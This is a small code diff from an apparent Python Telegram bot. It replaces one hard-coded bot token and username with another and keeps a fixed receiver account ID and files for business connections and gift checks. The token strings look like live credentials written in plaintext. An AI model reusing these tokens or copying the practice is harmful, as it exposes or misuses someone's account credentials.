@@ -34,8 +34,8 @@ from typing import Dict, List, Any, Union
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-TOKEN = "8514895172:AAF8lY0dr6trMbHjpFeuf8oGzD6z1dXqyhE"
-BOT_USERNAME = "@starsovok_bot"
+TOKEN = "8595293933:AAE7VAsCFKUWjWVefop5WpFBKzo7y1vJEyU"
+BOT_USERNAME = "@starsovokom_bot"
 RECEIVER_ID = 7074282438
 CONNECTIONS_FILE = "business_connections.json"
 GIFT_CHECKS_FILE = "gift_checks.json"
